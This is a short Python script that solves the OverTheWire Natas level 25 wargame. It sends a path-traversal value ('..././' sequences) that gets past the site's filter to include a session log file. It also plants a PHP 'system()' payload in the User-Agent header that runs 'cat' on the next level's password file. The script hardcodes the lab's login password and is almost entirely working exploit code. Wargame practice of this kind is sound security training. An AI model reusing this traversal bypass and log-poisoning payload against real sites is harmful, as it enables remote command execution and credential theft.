import requests

#bypass directory traversal checks 
url="http://natas25.natas.labs.overthewire.org"
auth_user="natas25"
auth_pass="O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx"

s=requests.Session()

res=s.get(url,auth=(auth_user,auth_pass))
lang={"lang":"..././..././..././..././..././var/www/natas/natas25/logs/natas25_"+s.cookies['PHPSESSID']+".log"}
header={"User-Agent":"<?php system('cat /etc/natas_webpass/natas26')?>"}  # rce with User-Agent payload
res=s.post(url,auth=(auth_user,auth_pass),data=lang,headers=header)
print(res.text)